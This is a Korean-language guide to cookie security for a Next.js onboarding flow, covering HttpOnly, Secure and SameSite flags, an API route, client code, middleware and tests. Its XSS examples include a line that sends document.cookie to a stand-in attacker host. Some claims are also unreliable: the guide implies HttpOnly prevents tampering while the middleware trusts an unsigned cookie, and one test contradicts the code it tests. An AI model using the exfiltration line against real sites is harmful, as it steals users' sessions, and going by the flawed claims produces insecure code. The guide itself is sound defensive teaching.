# 쿠키 보안 가이드 (Cookie Security Guide)

## 📋 목차
1. [HttpOnly란?](#httponly란)
2. [클라이언트 쿠키의 문제점](#클라이언트-쿠키의-문제점)
3. [보안 설정 방법](#보안-설정-방법)
4. [구현 가이드](#구현-가이드)
5. [테스트 방법](#테스트-방법)

---

## HttpOnly란?

### 정의

**HttpOnly는 쿠키에 설정하는 보안 플래그**로, JavaScript에서 쿠키에 접근하는 것을 차단합니다.

```javascript
// 일반 쿠키 (클라이언트 설정)
document.cookie = "user=john"
// → JavaScript에서 접근 가능
// → 누구든 document.cookie로 읽고 수정 가능

// HttpOnly 플래그 (서버 설정)
res.cookies.set('user', 'john', { httpOnly: true })
// → JavaScript에서 접근 불가능
// → HTTP 요청할 때만 브라우저가 자동으로 전송
// → document.cookie로 읽을 수 없음
```

### 동작 방식

```
┌─────────────────────────────────────┐
│     브라우저                        │
├─────────────────────────────────────┤
│  일반 쿠키                          │
│  ├─ document.cookie로 접근 ✅      │
│  ├─ JavaScript 수정 가능 ✅        │
│  └─ HTTP 요청 시 전송 ✅           │
│                                     │
│  HttpOnly 쿠키                      │
│  ├─ document.cookie로 접근 ❌      │
│  ├─ JavaScript 수정 불가 ❌        │
│  └─ HTTP 요청 시 전송 ✅ (자동)    │
└─────────────────────────────────────┘
```

### 비교표

| 구분 | 일반 쿠키 | HttpOnly 쿠키 | Secure 쿠키 | SameSite 쿠키 |
|-----|---------|--------------|-----------|--------------|
| JavaScript 접근 | ✅ 가능 | ❌ 불가능 | ✅ 가능 | ✅ 가능 |
| HTTP 요청 전송 | ✅ 자동 | ✅ 자동 | HTTPS만 | 같은 사이트만 |
| 클라이언트 수정 | ✅ 가능 | ❌ 불가능 | ✅ 가능 | ✅ 가능 |
| XSS 공격 방지 | ❌ | ✅ | ❌ | ❌ |
| CSRF 공격 방지 | ❌ | ❌ | ❌ | ✅ |
| 중간자 공격 방지 | ❌ | ❌ | ✅ | ❌ |

---

## 클라이언트 쿠키의 문제점

### 1️⃣ XSS (Cross-Site Scripting) 공격 취약

**XSS란?** 악의적인 JavaScript 코드를 웹페이지에 주입하는 공격

#### 공격 시나리오

```javascript
// ❌ 클라이언트 쿠키 방식 (현재 온보딩 코드)
document.cookie = "onboarding=done; path=/; max-age=31536000"

// 공격자가 악의적 코드를 주입했다고 가정:
// - 제3자 광고 라이브러리에서
// - 해킹된 npm 패키지에서
// - XSS 취약점을 통해

// 공격 코드:
const maliciousCode = `
  document.cookie = "admin=true";           // 권한 탈취
  document.cookie = "user_id=999";          // 다른 사용자 위장
  document.cookie = "onboarding=never";     // 온보딩 스킵
  
  // 또는 쿠키 값을 공격자 서버로 전송
  fetch('https://attacker.com/steal?data=' + document.cookie);
`;
```

#### 결과
```
사용자 A의 브라우저에서
  ↓
 악의적 코드 실행
  ↓
 쿠키 조작 / 도용
  ↓
 권한 탈취 또는 사용자 위장 😱
```

#### 실제 예시

**온보딩 완료 쿠키 조작:**
```javascript
// DevTools 콘솔에 입력하면 누구나 가능
document.cookie = "onboarding=done"; 
// 결과: 온보딩을 진짜 완료하지 않았는데 스킵됨

// 검증 없이 진행하면:
// → 사용자가 온보딩 스킵
// → 데이터 부실 입력
// → 서비스 품질 저하
```

---

### 2️⃣ 클라이언트 쿠키 조작 용이

**누구든 언제든 쿠키를 변경할 수 있음**

```javascript
// DevTools 콘솔에서 쉽게 조작 가능
document.cookie = "onboarding=done";      // 설정
document.cookie = "onboarding=pending";   // 변경
document.cookie = "onboarding=; max-age=0"; // 삭제

// 프로그래밍으로도 조작 가능
// 사용자가 악의적으로 개발자 도구를 사용하면:
// → 온보딩 상태 속임수
// → 권한 위장
// → 기능 잠금 해제
```

---

### 3️⃣ 신뢰할 수 없는 상태 저장

**서버가 쿠키를 신뢰할 수 없음**

```typescript
// middleware.ts
if (onboarding === 'done') {
  // ❌ 이 값을 신뢰할 수 있나?
  // → 클라이언트가 설정했으므로 위변조될 수 있음
  // → 서버 검증 없이는 믿을 수 없음
  return NextResponse.redirect(new URL('/demo', req.url));
}
```

---

### 4️⃣ 정보 유출 위험

```javascript
// 클라이언트 쿠키는 다음 방식으로 도용될 수 있음:

// 1. XSS를 통한 도용
fetch('https://attacker.com?data=' + document.cookie);

// 2. 네트워크 스니핑 (HTTPS 없을 때)
// HTTP 요청이 그대로 노출됨

// 3. 악의적 브라우저 확장 프로그램
// 쿠키에 접근하는 모든 JavaScript가 위험
```

---

## 보안 설정 방법

### ✅ 올바른 방식: 서버에서 HttpOnly 쿠키 설정

```typescript
// app/api/onboarding/complete/route.ts
import { NextResponse } from 'next/server';

export async function POST(req: Request) {
  try {
    // 1. 비즈니스 로직 (온보딩 완료 검증)
    const body = await req.json();
    
    // 2. 데이터베이스 업데이트
    // await db.updateUser(userId, { onboardingDone: true });
    
    // 3. ✅ 서버에서 HttpOnly 쿠키 설정
    const response = NextResponse.json({ 
      success: true,
      message: '온보딩이 완료되었습니다.'
    });
    
    response.cookies.set('onboarding', 'done', {
      // 🔒 보안 설정
      httpOnly: true,      // JavaScript 접근 불가 (XSS 방지)
      secure: true,        // HTTPS에서만 전송 (중간자 공격 방지)
      sameSite: 'strict',  // 같은 사이트에서만 전송 (CSRF 방지)
      
      // ⏰ 유효 기간
      maxAge: 60 * 60 * 24 * 365, // 1년 (초 단위)
      
      // 📍 적용 범위
      path: '/',
    });
    
    return response;
  } catch (error) {
    console.error('온보딩 완료 오류:', error);
    return NextResponse.json(
      { error: '온보딩을 완료할 수 없습니다.' },
      { status: 500 }
    );
  }
}
```

### 쿠키 옵션 상세 설명

```typescript
response.cookies.set('name', 'value', {
  // 1. HttpOnly: JavaScript 접근 차단
  //    - document.cookie로 읽기 불가
  //    - JavaScript로 쓰기 불가
  //    - XSS 공격 방지
  //    - 인증 정보, 민감한 데이터에 필수
  httpOnly: true,
  
  // 2. Secure: HTTPS 전송만 허용
  //    - HTTP 요청에서는 쿠키 전송 안 함
  //    - 중간자 공격(MITM) 방지
  //    - 프로덕션에서는 반드시 true
  secure: process.env.NODE_ENV === 'production',
  
  // 3. SameSite: CSRF 공격 방지
  //    - 'strict': 같은 사이트 요청에서만 전송 (가장 안전)
  //    - 'lax': 상위 페이지 네비게이션(링크 클릭 등)에서만 전송
  //    - 'none': 모든 요청에서 전송 (위험, Secure와 함께 사용)
  sameSite: 'strict',
  
  // 4. MaxAge: 쿠키 유효 기간 (초 단위)
  //    - 60 * 60 * 24 * 365 = 1년
  //    - 0 또는 음수 = 즉시 삭제
  maxAge: 60 * 60 * 24 * 365,
  
  // 5. Path: 쿠키 적용 경로
  //    - '/' = 모든 경로에서 사용
  //    - '/admin' = /admin 하위 경로에서만 사용
  path: '/',
  
  // 6. Domain (선택사항)
  //    - 쿠키를 공유할 도메인 지정
  //    - 생략하면 현재 도메인에만 적용
  // domain: '.example.com',
});
```

---

## 구현 가이드

### Step 1: API 엔드포인트 생성

**파일:** `app/api/onboarding/complete/route.ts`

```typescript
import { NextResponse } from 'next/server';

export async function POST(req: Request) {
  try {
    // (선택) 요청 본문 검증
    // const body = await req.json();
    
    // (선택) 사용자 ID 확인
    // const session = await getServerSession();
    // if (!session?.user) {
    //   return NextResponse.json({ error: '인증 필요' }, { status: 401 });
    // }
    
    // (선택) 데이터베이스에 온보딩 완료 기록
    // await db.users.update(
    //   { id: session.user.id },
    //   { onboardingCompletedAt: new Date() }
    // );
    
    const response = NextResponse.json({ success: true });
    
    response.cookies.set('onboarding', 'done', {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 60 * 60 * 24 * 365,
      path: '/',
    });
    
    return response;
  } catch (error) {
    console.error('온보딩 완료 오류:', error);
    return NextResponse.json(
      { error: '온보딩 완료 실패' },
      { status: 500 }
    );
  }
}
```

### Step 2: 클라이언트에서 API 호출

**파일:** `app/onboarding/_components/OnBoardingStep.tsx`

```typescript
'use client';

import { useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';
import { ONBOARDING_LIST } from '@/public/consts/onboarding';
import { isOnboardingDone, ONBOARDING_COOKIE } from '@/public/consts/onboardingConsts';

export const OnBoardingStepComponent = () => {
  const [currentStep, setCurrentStep] = useState(0);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const router = useRouter();

  useEffect(() => {
    const redirectIfDone = () => {
      if (isOnboardingDone()) {
        router.replace('/demo');
      }
    };

    redirectIfDone();

    const handlePageShow = (event: PageTransitionEvent) => {
      if (event.persisted) {
        redirectIfDone();
      }
    };

    window.addEventListener('pageshow', handlePageShow);
    return () => window.removeEventListener('pageshow', handlePageShow);
  }, [router]);

  const currentOnboarding = ONBOARDING_LIST[currentStep];

  // ✅ API를 통한 온보딩 완료
  const completeOnboarding = async () => {
    setIsLoading(true);
    setError(null);

    try {
      const res = await fetch('/api/onboarding/complete', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        // 쿠키를 요청에 포함시키기 (필요한 경우)
        credentials: 'same-origin',
      });

      if (!res.ok) {
        throw new Error(`온보딩 완료 실패 (${res.status})`);
      }

      // 응답에서 쿠키가 자동으로 설정됨
      router.replace('/demo');
    } catch (err) {
      const errorMessage = err instanceof Error ? err.message : '알 수 없는 오류';
      setError(errorMessage);
      console.error('온보딩 완료 오류:', err);
    } finally {
      setIsLoading(false);
    }
  };

  const handleNext = async () => {
    if (currentStep < ONBOARDING_LIST.length - 1) {
      // 마지막 스텝이 아니면 다음으로
      setCurrentStep(currentStep + 1);
    } else {
      // 마지막 스텝이면 API 호출
      await completeOnboarding();
    }
  };

  return (
    <>
      {/* 페이지 인디케이터 */}
      <div className='flex space-x-2 mt-4 border-b-2 border-gray-300 w-full'>
        {ONBOARDING_LIST.map((item, index) => (
          <div
            key={item?.id}
            className={`w-3 h-3 rounded-full transition-colors duration-300 mb-3 ${
              index === currentStep ? 'bg-primary' : 'bg-gray-300'
            }`}
          />
        ))}
      </div>

      {/* 진행률 */}
      <div className='text-sm text-gray-500 mb-4'>
        {currentStep + 1} / {ONBOARDING_LIST.length}
      </div>

      {/* 메인 콘텐츠 */}
      <div className='flex flex-col items-center justify-center flex-1 text-center'>
        {currentOnboarding?.icon && (
          <div className='mb-8'>
            <img
              src={currentOnboarding.icon}
              alt='onboarding'
              width={200}
              height={200}
              className='rounded-2xl shadow-lg'
            />
          </div>
        )}

        <h1 className='text-3xl font-bold text-gray-900 mb-6 whitespace-pre-line'>
          {currentOnboarding?.title}
        </h1>

        {currentOnboarding?.description && (
          <p className='text-lg text-gray-600 leading-relaxed whitespace-pre-line'>
            {currentOnboarding.description}
          </p>
        )}
      </div>

      {/* 에러 메시지 */}
      {error && (
        <div className='mb-4 p-3 bg-red-100 text-red-700 rounded-lg text-sm'>
          {error}
        </div>
      )}

      {/* 버튼 그룹 */}
      <div className='flex gap-3 w-full'>
        {/* 이전 버튼 */}
        <button
          onClick={() => setCurrentStep(currentStep - 1)}
          disabled={currentStep === 0 || isLoading}
          className='flex-1 py-3 px-4 text-lg font-semibold text-gray-700 bg-gray-200 rounded-xl hover:bg-gray-300 disabled:opacity-50 disabled:cursor-not-allowed transition'
        >
          이전
        </button>

        {/* 다음/시작 버튼 */}
        <button
          onClick={handleNext}
          disabled={isLoading}
          className='flex-1 py-3 px-4 text-lg font-semibold text-white bg-primary rounded-xl hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed transition'
        >
          {isLoading ? (
            <span className='flex items-center justify-center'>
              <span className='animate-spin mr-2'>⏳</span>
              처리 중...
            </span>
          ) : currentStep === ONBOARDING_LIST.length - 1 ? (
            '시작하기'
          ) : (
            '다음으로'
          )}
        </button>
      </div>
    </>
  );
};
```

### Step 3: 미들웨어 검증 유지

**파일:** `middleware.ts`

```typescript
import { NextRequest, NextResponse } from 'next/server';

export default function middleware(req: NextRequest) {
  const { pathname } = req.nextUrl;

  const token = req.cookies.get('next-auth.session-token')?.value;
  const onboarding = req.cookies.get('onboarding')?.value;

  const isOnboardingPath = pathname.startsWith('/onboarding');

  // ✅ HttpOnly 쿠키는 서버에서 자동으로 접근 가능
  if (onboarding === 'done' && isOnboardingPath) {
    return NextResponse.redirect(new URL(token ? '/user/dashboard' : '/demo', req.url));
  }

  if (pathname === '/' && !isOnboardingPath) {
    return NextResponse.redirect(new URL('/onboarding', req.url));
  }

  return NextResponse.next();
}

export const config = {
  matcher: ['/', '/onboarding/:path*'],
};
```

---

## 테스트 방법

### 1️⃣ 브라우저 DevTools 확인

```javascript
// Console 탭에서:

// 일반 쿠키 확인 가능
console.log(document.cookie);
// 출력: "user=john; theme=dark"

// HttpOnly 쿠키는 표시 안 됨
// 같은 쿠키를 설정하려고 해도 실패:
document.cookie = "onboarding=done";
// → 무시됨 (설정 실패)
```

### 2️⃣ Network 탭에서 확인

```
Request Headers:
Cookie: onboarding=done; _Secure-next-auth.session-token=abc123...
↑ 서버에서 설정한 모든 쿠키가 자동으로 전송됨

Response Headers (처음 설정할 때):
Set-Cookie: onboarding=done; Path=/; Max-Age=31536000; HttpOnly; Secure; SameSite=Strict
↑ HttpOnly, Secure, SameSite 플래그 확인 가능
```

### 3️⃣ 유닛 테스트

```typescript
// app/api/onboarding/complete/__tests__/route.test.ts
import { describe, it, expect } from 'vitest';
import { POST } from '../route';

describe('POST /api/onboarding/complete', () => {
  it('성공 시 HttpOnly 쿠키 설정', async () => {
    const req = new Request('http://localhost:3000/api/onboarding/complete', {
      method: 'POST',
    });

    const res = await POST(req);
    const setCookie = res.headers.get('set-cookie');

    // HttpOnly 플래그 확인
    expect(setCookie).toContain('HttpOnly');
    expect(setCookie).toContain('Secure');
    expect(setCookie).toContain('SameSite=Strict');
    expect(setCookie).toContain('onboarding=done');
  });

  it('쿠키에 maxAge 설정', async () => {
    const req = new Request('http://localhost:3000/api/onboarding/complete', {
      method: 'POST',
    });

    const res = await POST(req);
    const setCookie = res.headers.get('set-cookie');

    expect(setCookie).toContain('Max-Age=31536000'); // 1년
  });
});
```

### 4️⃣ E2E 테스트

```typescript
// e2e/onboarding.test.ts
import { test, expect } from '@playwright/test';

test('온보딩 완료 후 쿠키 설정 확인', async ({ page }) => {
  // 1. 온보딩 페이지 이동
  await page.goto('http://localhost:3000/onboarding');

  // 2. 마지막 스텝까지 진행
  for (let i = 0; i < 2; i++) {
    await page.click('button:has-text("다음으로")');
  }

  // 3. 시작하기 버튼 클릭
  await page.click('button:has-text("시작하기")');

  // 4. /demo로 리다이렉트 확인
  await expect(page).toHaveURL(/\/demo/);

  // 5. 쿠키 확인 (Application 탭에서)
  const cookies = await page.context().cookies();
  const onboardingCookie = cookies.find(c => c.name === 'onboarding');

  expect(onboardingCookie).toBeDefined();
  expect(onboardingCookie?.value).toBe('done');
  expect(onboardingCookie?.httpOnly).toBe(true);
  expect(onboardingCookie?.secure).toBe(true);
});
```

---

## 보안 체크리스트

온보딩 쿠키 설정 시 확인사항:

- [ ] ✅ API 엔드포인트에서 `httpOnly: true` 설정
- [ ] ✅ 프로덕션 환경에서 `secure: true` 설정
- [ ] ✅ `sameSite: 'strict'` 또는 `'lax'` 설정
- [ ] ✅ `maxAge` 명시적으로 설정
- [ ] ✅ 클라이언트에서 `document.cookie` 직접 설정 제거
- [ ] ✅ 에러 처리 추가 (API 호출 실패 시)
- [ ] ✅ 미들웨어에서 쿠키 검증
- [ ] ✅ 데이터베이스에도 온보딩 완료 기록 (쿠키 + DB 이중화)
- [ ] ✅ HTTPS 사용 (프로덕션)
- [ ] ✅ 테스트 작성 (유닛 + E2E)

---

## FAQ

### Q1: 왜 쿠키로 관리하나? 세션으로 안 되나?

**A:** 쿠키와 세션은 함께 사용됩니다.
- **쿠키**: 브라우저에 저장되는 키-값 쌍
- **세션**: 서버에 저장되는 사용자 상태

온보딩은 간단한 Boolean 상태이므로 쿠키로 충분합니다. 더 복잡한 데이터는 데이터베이스에 저장하세요.

### Q2: 미들웨어에서 쿠키를 어떻게 읽나?

**A:** 미들웨어는 서버에서 실행되므로 HttpOnly 쿠키도 읽을 수 있습니다.

```typescript
const onboarding = req.cookies.get('onboarding')?.value;
// ✅ 서버 코드이므로 HttpOnly 쿠키 접근 가능
```

### Q3: 클라이언트에서 쿠키 상태를 확인해야 하면?

**A:** API 엔드포인트를 호출해서 확인하세요.

```typescript
// app/api/onboarding/status/route.ts
export async function GET(req: Request) {
  const onboarding = req.cookies.get('onboarding')?.value;
  return NextResponse.json({ done: onboarding === 'done' });
}

// 클라이언트
const { done } = await fetch('/api/onboarding/status').then(r => r.json());
```

### Q4: 개발 환경에서 Secure=false 해도 되나?

**A:** 개발 환경에서는 HTTP를 사용할 수 있으므로 조건부로 설정하세요.

```typescript
secure: process.env.NODE_ENV === 'production'
// 또는
secure: typeof window === 'undefined' && process.env.NODE_ENV === 'production'
```

---

## 참고 자료

- [MDN: HTTPOnly](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies)
- [OWASP: Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [Next.js: Cookies](https://nextjs.org/docs/app/api-reference/functions/cookies)
- [SameSite Cookie Explained](https://web.dev/samesite-cookies-explained/)

---

## 다음 단계

1. ✅ API 엔드포인트 생성 (`/api/onboarding/complete`)
2. ✅ OnBoardingStep 컴포넌트 수정
3. ✅ 에러 처리 추가
4. ✅ 테스트 작성
5. ✅ 배포 및 모니터링
